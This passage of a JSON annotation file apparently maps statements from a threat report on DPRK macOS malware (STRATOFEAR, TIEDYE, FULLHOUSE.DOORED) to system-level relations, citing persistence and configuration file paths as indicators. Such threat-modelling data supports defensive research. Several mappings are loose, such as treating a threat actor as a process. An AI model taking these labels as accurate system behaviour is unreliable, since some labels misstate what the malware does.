                "relationship": "[Description]: The text states that \"STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED,\" indicating that FULLHOUSE.DOORED was deployed before STRATOFEAR. [Original Relationships]: <process:FULLHOUSE.DOORED,deployed,process:STRATOFEAR>. ",
                "semantic_relationship": "[CoT]: The term \"deployed\" in the original relationship implies that FULLHOUSE.DOORED initiated the creation of STRATOFEAR. In system-level terms, this corresponds to a Fork relationship from FULLHOUSE.DOORED to STRATOFEAR. [System-level Relationships]: <process:FULLHOUSE.DOORED,Fork,process:STRATOFEAR>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that STRATOFEAR \"communicates with C2 servers using a protocol specified in its C2 configuration,\" showing that STRATOFEAR interacts with C2 servers for communication. [Original Relationships]: <process:STRATOFEAR,communicates with,socket:C2 servers>. ",
                "semantic_relationship": "[CoT]: The original relationship states that STRATOFEAR \"communicates with C2 servers\" using a specified protocol. In system-level terms, this communication implies establishing a connection to the C2 servers, which is best represented by the \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:STRATOFEAR,Connect,socket:C2 servers>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text describes that \"modules may be downloaded from a remote server,\" indicating that STRATOFEAR downloads modules from a remote server. [Original Relationships]: <process:STRATOFEAR,downloads from,socket:remote server>. ",
                "semantic_relationship": "[CoT]: The original relationship \"downloads from\" implies that STRATOFEAR receives data from the remote server, which aligns with the system-level relationship \"Receive\" between a process and a socket. [System-level Relationships]: <process:STRATOFEAR,Receive,socket:remote server>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that \"modules may be downloaded... or loaded from disk,\" showing that STRATOFEAR loads modules from disk. [Original Relationships]: <process:STRATOFEAR,loads,file:modules from disk>. ",
                "semantic_relationship": "[CoT]: The original relationship states that STRATOFEAR loads modules from disk, which directly corresponds to the system-level relationship 'Loadlibrary' between a process and a file. [System-level Relationships]: <process:STRATOFEAR,Loadlibrary,file:modules from disk>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that \"The first path (/Library/Fonts/ArialUnicode.ttf.md5) stores the backdoor's full configuration,\" indicating that STRATOFEAR stores its configuration in this file path. [Original Relationships]: <process:STRATOFEAR,stores,file:/Library/Fonts/ArialUnicode.ttf.md5>. ",
                "semantic_relationship": "[CoT]: The original relationship \"stores\" implies that the process STRATOFEAR is writing data to the file /Library/Fonts/ArialUnicode.ttf.md5, which aligns with the system-level relationship \"Write\" between a process and a file. [System-level Relationships]: <process:STRATOFEAR,Write,file:/Library/Fonts/ArialUnicode.ttf.md5>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text describes that \"The second path (/Library/Fonts/ArialUnicode.ttf.md5.1) may be used to store logging information,\" showing that STRATOFEAR stores logging information in this file path. [Original Relationships]: <process:STRATOFEAR,stores,file:/Library/Fonts/ArialUnicode.ttf.md5.1>. ",
                "semantic_relationship": "[CoT]: The original relationship states that STRATOFEAR \"stores\" information in the file, which implies writing data to the file. Therefore, the system-level relationship is \"Write\" from the process to the file. [System-level Relationships]: <process:STRATOFEAR,Write,file:/Library/Fonts/ArialUnicode.ttf.md5.1>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that \"Downloaded modules may be written to a .tmp file in the $1$ TMPDIR or /tmp directory,\" indicating that STRATOFEAR writes downloaded modules to .tmp files in specified directories. [Original Relationships]: <process:STRATOFEAR,writes,file:.tmp files>. ",
                "semantic_relationship": "[CoT]: The original relationship states that STRATOFEAR \"writes\" to .tmp files, which directly corresponds to the system-level \"Write\" relationship between a process and a file. This indicates that the process is creating or modifying the temporary files in the specified directories. [System-level Relationships]: <process:STRATOFEAR,Write,file:.tmp files>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that STRATOFEAR's code references \"five predefined module types that have an ID value and an internal name,\" showing that STRATOFEAR references these module types. [Original Relationships]: <process:STRATOFEAR,references,process:module types>. ",
                "semantic_relationship": "[CoT]: The original relationship \"references\" between STRATOFEAR and the module types implies that STRATOFEAR is loading or incorporating the module types into its process space, which aligns with the system-level relationship \"Loadlibrary\". [System-level Relationships]: <process:STRATOFEAR,Loadlibrary,process:module types>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that TIEDYE was likely deployed as a second-stage backdoor by FULLHOUSE.DOORED, indicating a process-to-process relationship. [Original Relationships]: <process:FULLHOUSE.DOORED,deployed,process:TIEDYE>. ",
                "semantic_relationship": "[CoT]: The term \"deployed\" in the original relationship implies that FULLHOUSE.DOORED created or spawned the TIEDYE process, which aligns with the system-level \"Fork\" relationship between processes. [System-level Relationships]: <process:FULLHOUSE.DOORED,Fork,process:TIEDYE>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that TIEDYE can communicate with a C2 server, indicating a process-to-socket relationship. [Original Relationships]: <process:TIEDYE,communicate with,socket:C2 server>. ",
                "semantic_relationship": "[CoT]: The original relationship \"communicate with\" implies that TIEDYE establishes a connection to the C2 server, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:TIEDYE,Connect,socket:C2 server>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text describes that TIEDYE was configured to persist via a LaunchAgent, indicating a process-to-file relationship. [Original Relationships]: <process:TIEDYE,persist via,file:LaunchAgent>. ",
                "semantic_relationship": "[CoT]: The original relationship \"persist via\" implies that the process TIEDYE is writing to a file (LaunchAgent) to establish persistence. In system-level terms, this corresponds to a \"Write\" action from a process to a file. [System-level Relationships]: <process:TIEDYE,Write,file:LaunchAgent>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that the current version of TIEDYE contains the functionality to create a LaunchAgent at specific file paths, indicating a process-to-file relationship. [Original Relationships]: <process:TIEDYE,create,file:LaunchAgents/com.studentd.agent.plist>. ",
                "semantic_relationship": "[CoT]: The original relationship states that TIEDYE creates a file (LaunchAgent). In system-level terms, this corresponds to a Process-to-File 'Create' action, as the process is generating a new file on the system. [System-level Relationships]: <process:TIEDYE,Create,file:LaunchAgents/com.studentd.agent.plist>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions another file path where the LaunchAgent can be created, indicating another process-to-file relationship. [Original Relationships]: <process:TIEDYE,create,file:/Library/LaunchDaemons/com.studentd.agent.plist>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the process \"TIEDYE\" creates a file at \"/Library/LaunchDaemons/com.studentd.agent.plist\". In system-level terms, this corresponds to the \"Create\" action between a process and a file. The action \"create\" in the original relationship directly maps to the system-level relationship \"Create\". [System-level Relationships]: <process:TIEDYE,Create,file:/Library/LaunchDaemons/com.studentd.agent.plist>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that RGB units utilize L2TP IPsec tunnels, indicating a process-to-socket relationship where the process utilizes the L2TP IPsec tunnel. [Original Relationships]: <process:RGB units, utilize, socket:L2TP IPsec tunnels>. ",
                "semantic_relationship": "[CoT]: The original relationship states that RGB units \"utilize\" L2TP IPsec tunnels, which implies the process is establishing a connection to the socket. In system-level terms, this corresponds to a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:RGB units,Connect,socket:L2TP IPsec tunnels>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that Operational Relay Boxes (ORBs) use commercial VPN providers for obfuscation, indicating a process-to-socket relationship where the process uses the commercial VPN providers. [Original Relationships]: <process:ORBs, utilize, socket:commercial VPN providers>. ",
                "semantic_relationship": "[CoT]: The original relationship \"utilize\" implies that the ORBs are establishing a connection to the commercial VPN providers' sockets to obfuscate their communications. In system-level terms, this maps to a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:ORBs,Connect,socket:commercial VPN providers>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text describes UNC4899 utilizing various VPN providers as a final hop, indicating a process-to-socket relationship where the process utilizes the VPN providers. [Original Relationships]: <process:UNC4899, utilize, socket:VPN providers>. ",
                "semantic_relationship": "[CoT]: The original relationship \"utilize\" implies that UNC4899 is establishing a connection to the VPN providers' sockets to access their services. In system-level terms, this corresponds to a \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:UNC4899,Connect,socket:VPN providers>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions UNC4899 connecting directly to an attacker-controlled ORB from their subnet, indicating a process-to-socket relationship where the process connects to the ORB. [Original Relationships]: <process:UNC4899, connect, socket:ORB>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (UNC4899) connecting to a socket (ORB). In the system-level framework, this maps directly to the 'Connect' relationship between a process and a socket. [System-level Relationships]: <process:UNC4899,Connect,socket:ORB>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text describes the DPRK threat actor logging directly into a Pyongyang IP from one of their jump boxes, indicating a process-to-socket relationship where the process logs into the IP address. [Original Relationships]: <process:DPRK threat actor, log, socket:Pyongyang IP>. ",
                "semantic_relationship": "[CoT]: The original relationship describes the DPRK threat actor logging into a Pyongyang IP, which in system-level terms translates to a Process-to-Socket 'Connect' relationship. This indicates the process is establishing a connection to the socket (IP address). [System-level Relationships]: <process:DPRK threat actor,Connect,socket:Pyongyang IP>. "
            }
        ]
    }
]